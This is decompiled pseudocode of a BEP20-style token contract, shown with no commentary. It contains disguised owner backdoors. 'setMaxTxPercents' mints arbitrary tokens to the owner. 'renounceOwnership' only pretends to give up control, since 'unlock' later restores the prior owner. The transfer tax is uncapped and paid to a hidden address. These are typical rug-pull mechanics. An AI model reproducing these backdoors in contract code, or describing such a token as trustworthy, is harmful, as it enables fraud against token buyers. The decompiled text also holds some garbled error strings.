contract main {




// =====================  Runtime code  =====================


address owner;
address stor1;
uint8 stor2;
uint256 stor2; offset 8
uint256 securityLevel;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
uint8 _decimals;
array of uint256 _symbol;
array of uint256 _name;
address stor9;
uint256 _taxFee;
uint256 _liquidityFee;
uint256 _maxTxAmount;

function name() payable {
    return _name[0 len _name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return _decimals
}

function _decimals() payable {
    return _decimals
}

function _taxFee() payable {
    return _taxFee
}

function SecurityLevel() payable {
    return securityLevel
}

function _liquidityFee() payable {
    return _liquidityFee
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function _maxTxAmount() payable {
    return _maxTxAmount
}

function getOwner() payable {
    return owner
}

function owner() payable {
    return owner
}

function symbol() payable {
    return _symbol[0 len _symbol.length]
}

function _symbol() payable {
    return _symbol[0 len _symbol.length]
}

function _name() payable {
    return _name[0 len _name.length]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function setTaxFeePercent(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'wOwnable: caller is not the owne'
    _taxFee = arg1
}

function setLiquidityFeePercent(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'wOwnable: caller is not the owne'
    _liquidityFee = arg1
}

function renounceOwnership(uint8 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'wOwnable: caller is not the owne'
    stor1 = owner
    owner = 0
    uint8(stor2.field_0) = arg1
    Mask(248, 0, stor2.field_8) = 0
    emit OwnershipTransferred(address arg1, address arg2)
    emit 0x0 
    emit 0x0 
}

function setMaxTxPercents(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'wOwnable: caller is not the owne'
    require msg.sender
    if arg1 + balanceOf[address(msg.sender)] < balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(msg.sender)] += arg1
    emit 0x65ddf252: arg1, 0, msg.sender
    return 1
}

function unlock() payable {
    if stor1 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x65596f7520646f6e27742068617665207065726d697373696f6e20746f20756e6c6f63,
                    mem[199 len 29]
    if block.timestamp <= securityLevel:
        revert with 0, 'Contract is locked until 7 days'
    emit OwnershipTransferred(owner, stor1);
    owner = stor1
}

function setMaxTxPercent(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'wOwnable: caller is not the owne'
    if not totalSupply:
        _maxTxAmount = 0
    else:
        if arg1 * totalSupply / totalSupply != arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        _maxTxAmount = arg1 * totalSupply / 1000
}

function burn(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x6f42455032303a206275726e2066726f6d20746865207a65726f20616464726573,
                    mem[197 len 31]
    if arg1 > balanceOf[address(msg.sender)]:
        revert with 0, ''
    balanceOf[address(msg.sender)] -= arg1
    if arg1 > totalSupply:
        revert with 0, 'SafeMath: subtraction overflow'
    totalSupply -= arg1
    emit 0x65ddf252: arg1, msg.sender, 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x6542455032303a20417070726f76652066726f6d207468652073656e64657220616464726573,
                    mem[202 len 26]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0xfe42455032303a20417070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 > allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 
                    32,
                    37,
                    0xef42455032303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,
                    mem[165 len 27],
                    mem[219 len 5]
    if not msg.sender:
        revert with 0, 32, 38, 0x6542455032303a20417070726f76652066726f6d207468652073656e64657220616464726573, mem[298 len 26]
    if not arg1:
        revert with 0, 32, 36, 0xfe42455032303a20417070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 + allowance[address(msg.sender)][address(arg1)] < allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x6542455032303a20417070726f76652066726f6d207468652073656e64657220616464726573,
                    mem[202 len 26]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0xfe42455032303a20417070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((arg2 + allowance[address(msg.sender)][address(arg1)]), msg.sender, arg1);
    return 1
}

function burnFrom(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 32, 36, 0x7342455032303a206275726e20616d6f756e74206578636565647320616c6c6f77616e63, mem[164 len 28], mem[220 len 4]
    if not arg1:
        revert with 0, 32, 38, 0x6542455032303a20417070726f76652066726f6d207468652073656e64657220616464726573, mem[298 len 26]
    if not msg.sender:
        revert with 0, 32, 36, 0xfe42455032303a20417070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    allowance[address(arg1)][address(msg.sender)] -= arg2
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg2), arg1, msg.sender);
    if not arg1:
        revert with 0, 32, 33, 0x6f42455032303a206275726e2066726f6d20746865207a65726f20616464726573, mem[293 len 31]
    if arg2 > balanceOf[address(arg1)]:
        revert with 0, ''
    balanceOf[address(arg1)] -= arg2
    if arg2 > totalSupply:
        revert with 0, 'SafeMath: subtraction overflow'
    totalSupply -= arg2
    emit 0x65ddf252: arg2, arg1, 0
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x726164647265737320726563697069656e742c2075696e7432353620616d6f756e74,
                    mem[198 len 30]
    if not arg1:
        revert with 0, 'address _owner, address spender'
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x2942455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(msg.sender)] -= arg2
    if arg2 + balanceOf[arg1] < balanceOf[arg1]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
    if arg2 / 100 * _taxFee > arg2 + balanceOf[arg1]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(arg1)] = arg2 + balanceOf[arg1] - (arg2 / 100 * _taxFee)
    emit 0x65ddf252: arg2, msg.sender, arg1
    if (arg2 / 100 * _taxFee) + balanceOf[stor9] < balanceOf[stor9]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[stor9] += arg2 / 100 * _taxFee
    emit 0x65ddf252: balanceOf[stor9], msg.sender, stor9
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x726164647265737320726563697069656e742c2075696e7432353620616d6f756e74,
                    mem[198 len 30]
    if not arg2:
        revert with 0, 'address _owner, address spender'
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x2942455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if arg3 + balanceOf[arg2] < balanceOf[arg2]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
    if arg3 / 100 * _taxFee > arg3 + balanceOf[arg2]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(arg2)] = arg3 + balanceOf[arg2] - (arg3 / 100 * _taxFee)
    emit 0x65ddf252: arg3, arg1, arg2
    if (arg3 / 100 * _taxFee) + balanceOf[stor9] < balanceOf[stor9]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[stor9] += arg3 / 100 * _taxFee
    emit 0x65ddf252: balanceOf[stor9], arg1, stor9
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 
                    32,
                    40,
                    0x7342455032303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[328 len 24],
                    mem[376 len 8]
    if not arg1:
        revert with 0, 32, 38, 0x6542455032303a20417070726f76652066726f6d207468652073656e64657220616464726573, mem[458 len 26]
    if not msg.sender:
        revert with 0, 32, 36, 0xfe42455032303a20417070726f76652066726f6d20746865207a65726f20616464726573, mem[456 len 28]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
